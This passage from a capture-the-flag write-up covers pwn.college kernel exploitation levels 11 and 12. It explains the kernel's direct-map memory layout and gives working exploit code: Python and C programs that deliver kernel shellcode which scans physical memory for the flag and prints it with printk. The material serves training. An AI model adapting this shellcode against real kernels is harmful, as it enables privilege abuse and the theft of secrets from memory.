3. Virtual memory map, `vmemmap_base`, defined by `VMEMMAP_START`. Maps the `vmemmap` - a global array in virtual memory that indexes all pages, currently tracked by the kernel.  

4. kernel text mapping, mapped to physical address 0. Defined by `__START_KERNEL_map`. This means that by reading the `page_offset_base`, the first bytes we see are actually the start of the kernel's text section!

5. module mapping space, defined as: `#define MODULES_VADDR (__START_KERNEL_map + KERNEL_IMAGE_SIZE)`. 

Since the physical memory is contigious, by scanning the special direct-map region, it is guranteed we'd never access an unmapped page. If the child process would die, we would have to make sure our exploit wouldn't consume too much memory. Otherwise, the target flag's physical page would've been swapped out. Moreover, the flag will always be loaded to a constant offset within a page. Hence, we can greatly optimize our scanner such that it would only scan certain offsets within physical pages. But I'd actually prefer making a generic yet slow scanner, instead of a fast and offset-specific scanner. The scanner would simply search for `"pwn.college{"` within all physical memory, and upon finding an adequate candidate, call `printk` on it. 

```python
BINARY = '/challenge/babykernel_level11.0'
GDB_SCRIPT= '''
set follow-fork-mode child
set print elements 0
handle SIG33 nostop noprint

c
'''

context.arch = 'amd64'
SHELLCODE = '''
user_shellcode:
mov rdi, 3
lea rsi, [rip + kernel_shellcode]
mov rdx, 0x1000
mov rax, 1
syscall

kernel_shellcode:
push rbx
push rbp
mov rbp, rsp
mov rbx, 0xffff888000000000

read_loop:
mov cl, byte ptr [rbx]
cmp cl, 0x70
jne next

mov cl, byte ptr [rbx + 1]
cmp cl, 0x77
jne next

mov cl, byte ptr [rbx + 2]
cmp cl, 0x6e
jne next

mov cl, byte ptr [rbx + 3]
cmp cl, 0x2e
jne next

mov cl, byte ptr [rbx + 4]
cmp cl, 0x63
jne next

mov cl, byte ptr [rbx + 5]
cmp cl, 0x6f
jne next

mov cl, byte ptr [rbx + 6]
cmp cl, 0x6c
jne next

mov cl, byte ptr [rbx + 7]
cmp cl, 0x6c
jne next

mov cl, byte ptr [rbx + 8]
cmp cl, 0x65
jne next

mov cl, byte ptr [rbx + 9]
cmp cl, 0x67
jne next

mov cl, byte ptr [rbx + 10]
cmp cl, 0x65
jne next

mov cl, byte ptr [rbx + 11]
cmp cl, 0x7b
jne next
jmp done

next:
add rbx, 1
jmp read_loop

done:
mov rdi, rbx
mov rbx, 0xffffffff810b69a9
call rbx

mov rsp, rbp
pop rbp
pop rbx
ret
'''

def main():    
    p = process(BINARY)
    
    user_shellcode = asm(SHELLCODE)
    with open('gdb_input.bin', 'wb') as f:
        f.write(user_shellcode)
    
    p.send(user_shellcode)
    p.interactive()
```

The since we call `printk` within the shellcode, the flag's content may be read via `dmesg`. 

## Challenge 12

The kernel module is exactly the same, and there's still no KASLR. However, the userspace component now terminates the child process upon loading the flag to its memory. **This means that the flag's corresponding physical page may now be swapped out**. Hence, we will no longer be able to traverse over so many pages, as it would definently cause a swap out of our goal flag's page. \
Instead, because there's no KASLR (but there are still pretty randomized allocations at the physical address space), we can predict a somewhat wrapping region where the flag's physical page resides, and only perform the scan from there. Moreover, notice we wouldn't like to use the python interpreter - as it uses lots of pages, and may trigger great physical pages swap-out. \
By kernel debugging right after the child had terminated and before the shellcode have been executed, using the following command I could find the flag's address:

```bash
(gdb) find /b page_offset_base, +0x80000000, 'p', 'w', 'n', '.', 'c', 'o', 'l', 'l', 'e', 'g', 'e', '{'
0xffff888003399040
```

After repeating this procedure multiple times, I've found the flag was also loaded to the following addresses:

```bash
0xffff888003320040
0xffff8880033ed040
```
 
So the goal physical page is always allocated somewhere near `0x3300000`. However, when I think about it - the amount of traversed pages within `page_offset_base` have no major impact about the exploit's statistics. The reason behind this, is that **all pages within page_offset_base** are already mapped to physical memory, by definition. Hence - accessing them should not cause any page swap-out. \
Using a python interpreter - does, as during the time frame between the child's termination and the input that is being sent towards the parent, the python interpreter does many high-level operations, that may easily cause swap out. 

```c
#define SHELLCODE_SIZE 0x1000
#define BINARY "/challenge/babykernel_level12.0"

int main(int argc, char* argv[])
{
    int res = 0;

    uint8_t shellcode[SHELLCODE_SIZE] = { 0x48, 0xC7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x35, 0x10, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x00, 0x10, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x80, 0x88, 0xFF, 0xFF, 0x8A, 0x0B, 0x80, 0xF9, 0x70, 0x75, 0x5A, 0x8A, 0x4B, 0x01, 0x80, 0xF9, 0x77, 0x75, 0x52, 0x8A, 0x4B, 0x02, 0x80, 0xF9, 0x6E, 0x75, 0x4A, 0x8A, 0x4B, 0x03, 0x80, 0xF9, 0x2E, 0x75, 0x42, 0x8A, 0x4B, 0x04, 0x80, 0xF9, 0x63, 0x75, 0x3A, 0x8A, 0x4B, 0x05, 0x80, 0xF9, 0x6F, 0x75, 0x32, 0x8A, 0x4B, 0x06, 0x80, 0xF9, 0x6C, 0x75, 0x2A, 0x8A, 0x4B, 0x07, 0x80, 0xF9, 0x6C, 0x75, 0x22, 0x8A, 0x4B, 0x08, 0x80, 0xF9, 0x65, 0x75, 0x1A, 0x8A, 0x4B, 0x09, 0x80, 0xF9, 0x67, 0x75, 0x12, 0x8A, 0x4B, 0x0A, 0x80, 0xF9, 0x65, 0x75, 0x0A, 0x8A, 0x4B, 0x0B, 0x80, 0xF9, 0x7B, 0x75, 0x02, 0xEB, 0x06, 0x48, 0x83, 0xC3, 0x01, 0xEB, 0x99, 0x48, 0x89, 0xDF, 0x48, 0xC7, 0xC3, 0xA9, 0x69, 0x0B, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
    
    int exploit_pipe[2] = {0};
    if (pipe(exploit_pipe) < 0)
    {
        goto cleanup;
    }

    pid_t pid = fork();
    if (pid < 0)
    {
        goto cleanup;
    }

    else if (pid == 0)
    {
        /* Child */
        if (dup2(exploit_pipe[0], STDIN_FILENO) < 0)
        {
            goto cleanup;
        }
        close(exploit_pipe[0]);
        close(exploit_pipe[1]);

        char *const argv[] = { BINARY, 0 };
        execve(argv[0], argv, 0);
    }

    else
    {
        /* Parent */
        if (write(exploit_pipe[1], shellcode, sizeof(shellcode)) < 0)
        {
            goto cleanup;
        }
        int wstatus = 0;
        waitpid(pid, &wstatus, 0);
    }

    close(exploit_pipe[0]);
    close(exploit_pipe[1]);

    return 0;

cleanup:
    printf("error: %s\n", strerror(errno));
    return 1;
}
```


## Further Reading

```bash
https://github.com/lorenzo-stoakes/linux-mm-notes
https://github.com/xairy/linux-kernel-exploitation
https://zolutal.github.io/understanding-paging/
https://www.youtube.com/playlist?list=PLMOpZvQB55bcRA5-KjvW7dVyGUarcqZuL
https://hackmd.io/@whoisthatguy/Byk3uVB56?utm_source=preview-mode&utm_medium=rec
https://ctf-wiki.mahaloz.re/pwn/linux/kernel/ret2usr/
https://www.interruptlabs.co.uk/articles/pipe-buffer
```


[pwnkernel]: https://github.com/pwncollege/pwnkernel/tree/main
[setup1]: https://scoding.de/linux-kernel-exploitation-environment
[setup2]: https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/
[setup3]: https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
[kernel-gs]: https://slavaim.blogspot.com/2017/09/linux-kernel-debugging-with-gdb-getting.html
[kernel-scan]: https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
[linternals]: https://sam4k.com/linternals-virtual-memory-part-3/
